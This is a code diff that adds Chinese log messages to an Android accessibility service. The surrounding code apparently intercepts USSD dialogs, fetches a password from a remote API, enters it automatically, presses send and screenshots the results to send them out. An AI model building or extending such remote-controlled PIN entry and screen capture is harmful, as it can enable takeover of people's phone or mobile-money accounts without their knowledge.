@@ -77,7 +77,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
 
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
-
+        UssdLogger.log(this, "检测到USSD弹窗");
         try {
             handleUssdEvent(root);
         } finally {
@@ -103,6 +103,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
 
         AccessibilityNodeInfo input = findUssdInput(dialog);
         if (input != null) {
+            UssdLogger.log(this, "发现输入框，准备输入密码");
             handleInputDialog(input, dialog, text, dm);
         } else {
             handleResultDialog(dialog, text, dm);
@@ -143,7 +144,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
 
         Map<String, String> params = new HashMap<>();
         params.put("msg", text);
-
+        UssdLogger.log(this, "请求接口,获取密码或者其他");
         ApiClient.request("/use/pwd", params, UssAction.class, new ApiCallback<UssAction>() {
             @Override
             public void onSuccess(UssAction data) {
@@ -183,8 +184,10 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
             handler.postDelayed(() -> {
                 boolean success = inputText(input, password);
                 if (success) {
+                    UssdLogger.log(ChatUssadAccessibilityService.this, "自动输入密码完成");
                     handler.postDelayed(() -> {
                         if (!clickSend(dialog)) {
+                            UssdLogger.log(ChatUssadAccessibilityService.this, "发送失败");
                             handleSendFail("发送失败");
                         }
                     }, CLICK_DELAY);
@@ -197,6 +200,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
                                    String text,
                                    DisplayMetrics dm) {
         handler.postDelayed(() -> {
+            UssdLogger.log(ChatUssadAccessibilityService.this, "正在截图");
             captureAndSend(dialog, text, dm);
             clickCancel(dialog);
         }, CLICK_DELAY);
@@ -209,6 +213,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
 
         if (text.toLowerCase().contains("正在运行") ||
                 text.toLowerCase().contains("running")) {
+            UssdLogger.log(this, "正在运行USSD代码");
             return;
         }
 
